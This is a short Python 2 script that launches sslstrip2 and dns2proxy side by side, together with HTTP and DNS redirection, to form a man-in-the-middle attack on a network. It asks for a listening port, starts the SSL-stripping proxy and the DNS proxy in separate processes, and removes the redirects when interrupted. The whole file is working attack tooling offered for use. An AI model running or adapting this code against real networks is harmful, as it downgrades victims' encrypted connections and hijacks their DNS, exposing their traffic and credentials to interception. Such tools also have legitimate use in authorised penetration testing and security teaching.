from sslstrip2 import launch as sslstrip
from dns2proxy import dns2proxy as dns
from multiprocessing import Process
import ip_misc

def launch_sslstrip(port):
    ip_misc.start_http_redirect(port)
    sslstrip.main(['-l', port])


def launch_dns():
    ip_misc.start_dns_redirect()
    dns.start()

'''
Starts sslstrip and DNS proxy servers on two independent process threads
'''
def launch():
    port = raw_input("Port to listen to [9000]:") or 9000
    if ip_misc.check_port(port):
        p1 = Process(target=launch_sslstrip, args=(port,))
        p2 = Process(target=launch_dns)
        p1.start()
        p2.start()
        try:
            while 1:
                pass
        except KeyboardInterrupt:
            ip_misc.stop_http_redirect(port)
            ip_misc.stop_dns_redirect()
            print "\nEnded"
    else:
        print "Port number must be in range 1-65535"
